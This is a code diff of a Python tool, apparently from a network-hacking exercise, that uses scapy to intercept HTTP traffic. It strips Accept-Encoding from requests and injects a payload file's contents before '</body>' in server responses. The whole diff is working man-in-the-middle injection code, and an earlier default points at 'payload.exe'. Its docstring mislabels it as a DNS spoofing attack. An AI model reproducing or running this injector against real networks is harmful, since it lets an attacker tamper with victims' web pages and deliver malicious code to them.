@@ -20,7 +20,7 @@ class CodeInjector:
         self.ack_list = []
         
 
-    def run(self, drop:bool = False, payload_path:str = "127.0.0.1/payload.exe"):
+    def run(self, drop:bool = False, payload_path:str = "../4_payloads/test.txt"):
         """
         Run a DNS spoofing attack
         """
@@ -34,18 +34,27 @@ class CodeInjector:
         """
         Process the desired packet to modify it
         """
+        with open(self.payload_path, "r") as f:
+            new_code = f.read()
         scp_packet = scapy.IP(packet.get_payload())
         #Work only on HTTP response, source/destination port 80
         if scp_packet.haslayer(scapy.Raw) and scp_packet.haslayer(scapy.TCP):
             #Request
+            load = str(scp_packet[scapy.Raw].load)
             if scp_packet[scapy.TCP].dport == 80:
                 r_pattern = "Accept-Encoding:.*?\\r\\n"
-                re.sub(r_pattern, "", scp_packet[scapy.Raw].load)
+                modified_load = re.sub(r_pattern, "", load)
+                print(modified_load)
+                scp_packet[scapy.Raw].load = modified_load
+                packet.set_payload(bytes(scp_packet))
                 print("request")
                 
             elif scp_packet[scapy.TCP].sport == 80:
                 #Answer is relevant?
-                print('response')
+                modified_load = load.replace("</body>", new_code+"</body>")
+                #print(modified_load)
+                scp_packet[scapy.Raw].load = modified_load
+                packet.set_payload(bytes(scp_packet))
 
         packet.set_payload(bytes(scp_packet))
         if self.drop:
